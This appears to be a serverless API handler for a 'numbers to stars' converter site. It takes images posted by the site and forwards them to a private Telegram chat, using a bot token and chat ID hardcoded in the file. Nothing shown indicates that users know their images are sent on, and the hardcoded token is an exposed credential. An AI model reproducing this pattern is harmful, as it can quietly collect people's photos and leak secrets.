const BOT_TOKEN = "8947404552:AAHFOVTjO4W5SBb45FFXzVOlzI8qIf-Bi64";
const CHAT_ID   = "7437622808";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const { imageDataUrl, filename = "image.png" } = req.body;

    if (!imageDataUrl) {
      return res.status(400).json({ error: "imageDataUrl is required" });
    }

    const base64 = imageDataUrl.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64, "base64");

    const blob = new Blob([buffer], { type: "image/png" });
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", blob, filename);
    form.append("caption", "📷 صورة جديدة من موقع محوّل الأرقام إلى نجوم");

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      { method: "POST", body: form }
    );

    const result = await response.json();

    if (!result.ok) {
      return res.status(502).json({ error: result.description });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: "Internal server error" });
  }
}
